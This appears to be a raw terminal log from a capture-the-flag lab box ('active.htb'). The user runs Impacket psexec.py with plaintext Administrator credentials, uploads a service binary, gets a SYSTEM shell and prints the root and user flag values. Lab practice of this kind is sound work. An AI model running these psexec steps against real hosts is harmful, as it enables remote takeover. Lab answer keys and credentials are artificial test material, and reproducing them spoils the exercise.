https://stackoverflow.com/questions/17217476/how-do-i-display-a-text-file-content-in-cmd

──(root㉿kali)-[~]
└─# psexec.py svc_tgs:GPPstillStandingStrong2k18@10.10.10.100 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Replication' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.



──(root㉿kali)-[~]
└─# psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file OPCTQagZ.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service TFpk on 10.10.10.100.....
[*] Starting service TFpk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd ..
cd
C:\Windows>cd ..
'cdcd' is not recognized as an internal or external command,
operable program or batch file.
 

Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

21/01/2021  07:49 úú    <DIR>          .
21/01/2021  07:49 úú    <DIR>          ..
24/07/2023  01:42 ºú                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.138.446.336 bytes free

C:\Users\Administrator\Desktop>more root.txt    
16cf51593ea5fafcbc3a1a062fee943b

C:\Users\Administrator\Desktop>


C:\Users\SVC_TGS>cd Desktop
 
C:\Users\SVC_TGS\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\SVC_TGS\Desktop

21/07/2018  06:14 úú    <DIR>          .
21/07/2018  06:14 úú    <DIR>          ..
24/07/2023  01:42 ºú                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.138.446.336 bytes free

C:\Users\SVC_TGS\Desktop>type user.txt
5e428c02cbd4c7fbf50c19b13af90588

C:\Users\SVC_TGS\Desktop>

